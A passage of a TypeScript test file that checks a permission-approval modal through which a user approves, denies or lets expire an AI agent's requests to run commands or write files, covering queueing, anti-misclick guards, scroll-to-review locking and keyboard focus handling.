      optionButtons[0].click();
      assert.deepStrictEqual(mockVsCode._getMessages(), []);

      releasePermissionGuard();
      assert.deepStrictEqual(
        optionButtons.map((button) => button.disabled),
        [false, false]
      );

      optionButtons[0].click();
      assert.deepStrictEqual(mockVsCode._getMessages(), [
        {
          type: "permissionResponse",
          requestId: "req-guard",
          optionId: "allow_always",
        },
      ]);
    });

    test("keeps approval locked until overflowing details are reviewed", () => {
      const content = document.querySelector(
        ".permission-content"
      ) as HTMLElement;
      Object.defineProperties(content, {
        clientHeight: { configurable: true, value: 100 },
        scrollHeight: { configurable: true, value: 400 },
        scrollTop: { configurable: true, value: 0, writable: true },
      });
      controller.showPermissionModal(
        "req-scroll",
        "Run command",
        { command: "/usr/bin/node", args: ["--version"] },
        [{ id: "allow", label: "Allow", kind: "allow_once" }],
        true
      );
      const button = document.querySelector(
        ".permission-option-btn"
      ) as HTMLButtonElement;

      releasePermissionGuard();
      assert.strictEqual(button.disabled, true);
      content.scrollTop = 300;
      content.dispatchEvent(new dom.window.Event("scroll"));
      assert.strictEqual(button.disabled, false);
    });

    test("denial stays available while the options are still guarded", () => {
      controller.showPermissionModal("req-deny", "Write File", "c", [
        { id: "allow_always", label: "Allow Always" },
      ]);

      const cancelBtn = document.querySelector(
        ".permission-cancel-btn"
      ) as HTMLButtonElement;
      assert.strictEqual(cancelBtn.disabled, false);

      document.dispatchEvent(
        new dom.window.KeyboardEvent("keydown", {
          key: "Escape",
          bubbles: true,
          cancelable: true,
        })
      );

      assert.ok(
        !document
          .getElementById("permission-modal")
          ?.classList.contains("visible")
      );
      assert.deepStrictEqual(mockVsCode._getMessages(), [
        {
          type: "permissionResponse",
          requestId: "req-deny",
          cancelled: true,
        },
      ]);
    });

    test("cancelPermission sends cancelled response", () => {
      const options = [{ id: "ok", label: "OK" }];

      controller.showPermissionModal("req-200", "Test", "content", options);
      controller.cancelPermission();

      const messages = mockVsCode._getMessages();
      const response = messages.find(
        (m: unknown) => (m as { type: string }).type === "permissionResponse"
      );
      assert.ok(response);
      assert.strictEqual(
        (response as { requestId: string }).requestId,
        "req-200"
      );
      assert.strictEqual((response as { cancelled: boolean }).cancelled, true);
    });

    test("handleMessage shows modal on permissionRequest", () => {
      controller.handleMessage({
        type: "permissionRequest",
        requestId: "req-300",
        title: "Execute Command",
        rawInput: { command: "npm test" },
        options: [
          { id: "run", label: "Run" },
          { id: "skip", label: "Skip" },
        ],
      });

      const modal = document.getElementById("permission-modal");
      assert.ok(modal?.classList.contains("visible"));

      const title = modal?.querySelector(".permission-title");
      assert.strictEqual(title?.textContent, "Agent requests permission");
    });

    test("queues a concurrent request and shows it after the first is cancelled", () => {
      controller.showPermissionModal("req-1", "First", "c1", [
        { id: "a", label: "A" },
      ]);
      controller.showPermissionModal("req-2", "Second", "c2", [
        { id: "b", label: "B" },
      ]);

      const modal = document.getElementById("permission-modal");
      let title = modal?.querySelector(".permission-title");
      assert.strictEqual(title?.textContent, "Agent requests permission");
      assert.ok(modal?.classList.contains("visible"));

      controller.cancelPermission();

      title = modal?.querySelector(".permission-title");
      assert.strictEqual(title?.textContent, "Agent requests permission");
      assert.ok(modal?.classList.contains("visible"));

      assert.deepStrictEqual(mockVsCode._getMessages(), [
        { type: "permissionResponse", requestId: "req-1", cancelled: true },
      ]);
      assert.strictEqual(document.activeElement, modal);
      assert.strictEqual(
        modal?.querySelector<HTMLButtonElement>(".permission-option-btn")
          ?.disabled,
        true
      );

      document.dispatchEvent(
        new dom.window.KeyboardEvent("keydown", {
          key: "Tab",
          bubbles: true,
          cancelable: true,
        })
      );
      assert.strictEqual(
        document.activeElement,
        modal?.querySelector(".permission-cancel-btn")
      );
      controller.cancelPermission();
    });

    test("queues a concurrent request and shows it after the first option is selected", () => {
      controller.showPermissionModal("req-1", "First", "c1", [
        { id: "allow", label: "Allow" },
      ]);
      controller.showPermissionModal("req-2", "Second", "c2", [
        { id: "b", label: "B" },
      ]);

      releasePermissionGuard();
      const optionBtn = document.querySelector(
        ".permission-option-btn"
      ) as HTMLButtonElement;
      optionBtn?.click();

      const modal = document.getElementById("permission-modal");
      const title = modal?.querySelector(".permission-title");
      assert.strictEqual(title?.textContent, "Agent requests permission");
      assert.ok(modal?.classList.contains("visible"));

      assert.deepStrictEqual(mockVsCode._getMessages(), [
        { type: "permissionResponse", requestId: "req-1", optionId: "allow" },
      ]);
      controller.hidePermissionModal();
    });

    test("does not let a repeated click approve the next queued request", () => {
      controller.showPermissionModal("req-1", "First", "c1", [
        { id: "allow-1", label: "Allow first" },
      ]);
      controller.showPermissionModal("req-2", "Second", "c2", [
        { id: "allow-2", label: "Allow second" },
      ]);

      releasePermissionGuard();
      const firstButton = document.querySelector(
        ".permission-option-btn"
      ) as HTMLButtonElement;
      firstButton.click();

      const secondButton = document.querySelector(
        ".permission-option-btn"
      ) as HTMLButtonElement;
      assert.strictEqual(secondButton.disabled, true);
      secondButton.click();

      assert.deepStrictEqual(mockVsCode._getMessages(), [
        { type: "permissionResponse", requestId: "req-1", optionId: "allow-1" },
      ]);
      assert.strictEqual(
        document.querySelector(".permission-title")?.textContent,
        "Agent requests permission"
      );

      controller.hidePermissionModal();
    });

    test("permissionRequestExpired hides the currently displayed modal without responding", () => {
      controller.showPermissionModal("req-1", "First", "c1", [
        { id: "a", label: "A" },
      ]);

      controller.handleMessage({
        type: "permissionRequestExpired",
        requestId: "req-1",
      });

      const modal = document.getElementById("permission-modal");
      assert.ok(!modal?.classList.contains("visible"));
      assert.strictEqual(mockVsCode._getMessages().length, 0);
      assert.ok(
        document
          .getElementById("messages")
          ?.textContent?.includes("Permission request expired and was denied.")
      );
    });

    test("permissionRequestExpired removes a queued request without disturbing the visible modal", () => {
      controller.showPermissionModal("req-1", "First", "c1", [
        { id: "a", label: "A" },
      ]);
      controller.showPermissionModal("req-2", "Second", "c2", [
        { id: "b", label: "B" },
      ]);

      controller.handleMessage({
        type: "permissionRequestExpired",
        requestId: "req-2",
      });

      const modal = document.getElementById("permission-modal");
      assert.ok(modal?.classList.contains("visible"));
      assert.strictEqual(
        modal?.querySelector(".permission-title")?.textContent,
        "Agent requests permission"
      );

      controller.cancelPermission();

      assert.ok(!modal?.classList.contains("visible"));
      assert.deepStrictEqual(mockVsCode._getMessages(), [
        {
          type: "permissionResponse",
          requestId: "req-1",
          cancelled: true,
        },
      ]);
    });

    test("chatCleared closes the visible modal and drops the queue", () => {
      controller.showPermissionModal("req-1", "First", "c1", [
        { id: "a", label: "A" },
      ]);
      controller.showPermissionModal("req-2", "Second", "c2", [
        { id: "b", label: "B" },
      ]);

      controller.handleMessage({ type: "chatCleared" });

      const modal = document.getElementById("permission-modal");
      assert.ok(!modal?.classList.contains("visible"));
      controller.cancelPermission();
      assert.strictEqual(mockVsCode._getMessages().length, 0);
    });

    test("Escape cancels the visible request and restores previous focus", () => {
      const input = document.getElementById("input") as HTMLTextAreaElement;
      input.focus();
      controller.showPermissionModal("req-1", "First", "c1", [
        { id: "a", label: "A" },
      ]);

      document.dispatchEvent(
        new dom.window.KeyboardEvent("keydown", {
          key: "Escape",
          bubbles: true,
          cancelable: true,
        })
      );

      assert.strictEqual(document.activeElement, input);
      assert.deepStrictEqual(mockVsCode._getMessages(), [
        {
          type: "permissionResponse",
          requestId: "req-1",
          cancelled: true,
        },
      ]);
    });

    test("clicking the backdrop cancels the visible request", () => {
      controller.showPermissionModal("req-1", "First", "c1", [
        { id: "a", label: "A" },
      ]);
      const modal = document.getElementById("permission-modal") as HTMLElement;

      modal.dispatchEvent(
        new dom.window.MouseEvent("click", { bubbles: true, cancelable: true })
      );

      assert.ok(!modal.classList.contains("visible"));
      assert.deepStrictEqual(mockVsCode._getMessages(), [
        {
          type: "permissionResponse",
          requestId: "req-1",
          cancelled: true,
        },
      ]);
    });

    test("Tab stays on cancel while approval controls are locked", () => {
      controller.showPermissionModal("req-1", "First", "c1", [
        { id: "a", label: "A" },
        { id: "b", label: "B" },
      ]);

      const modal = document.getElementById("permission-modal") as HTMLElement;
      const cancelBtn = modal.querySelector(
        ".permission-cancel-btn"
      ) as HTMLButtonElement;
      cancelBtn.focus();
      const event = new dom.window.KeyboardEvent("keydown", {
        key: "Tab",
        bubbles: true,
        cancelable: true,
      });
      document.dispatchEvent(event);

      assert.strictEqual(document.activeElement, cancelBtn);
    });

    test("Shift+Tab wraps focus from the first to the last focusable element", () => {
      controller.showPermissionModal("req-1", "First", "c1", [
        { id: "a", label: "A" },
        { id: "b", label: "B" },
      ]);

      const modal = document.getElementById("permission-modal") as HTMLElement;
      const cancelBtn = modal.querySelector(
        ".permission-cancel-btn"
      ) as HTMLButtonElement;
      const firstOptionBtn = modal.querySelector(
        ".permission-option-btn"
      ) as HTMLButtonElement;

      firstOptionBtn.focus();
      const event = new dom.window.KeyboardEvent("keydown", {
        key: "Tab",
        shiftKey: true,
        bubbles: true,
        cancelable: true,
      });
      document.dispatchEvent(event);

      assert.strictEqual(document.activeElement, cancelBtn);
    });
  });
});
